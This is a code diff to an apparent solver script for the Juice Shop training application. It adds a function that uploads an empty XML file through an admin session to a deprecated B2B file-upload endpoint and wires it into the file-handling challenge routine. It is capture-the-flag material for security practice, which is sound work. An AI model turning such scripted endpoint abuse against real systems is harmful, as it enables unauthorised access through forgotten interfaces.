@@ -88,6 +88,26 @@ def _write_file_to_disk(filename, response):
         print('Downloaded {} to {}.'.format(response.url, fileloc))
 
 
+def deprecated_b2b(server, session):
+    """
+    Use a deprecated B2B interface that was not properly shut down.
+    :param server: juice shop URL
+    :param session: Session
+    """
+    filename = 'test.xml'
+    open(filename, "w").close()
+
+    print('Missusing deprecated B2B interface....'),
+
+    with open(filename, 'rb') as infile:
+        files = {'file': ('test.xml', infile, 'application/zip')}
+        session = get_admin_session(server)
+        upload = session.post('{}/file-upload'.format(server), files=files)
+        if not upload.ok:
+            raise RuntimeError('Error uploading file.')
+        print('Success.')
+    os.remove(filename)
+
 def solve_file_upload_challenges(server, session):
     """
     Create a junk file 150kb in size, upload it without a file extension, delete file when done
@@ -113,4 +133,5 @@ def solve_file_handling_challenges(server):
     download_files_from_ftp(server, session)
     solve_file_upload_challenges(server, session)
     download_access_log(server, session)
+    deprecated_b2b(server, session)
     print('\n== FILE HANDLING CHALLENGES COMPLETE ==\n')
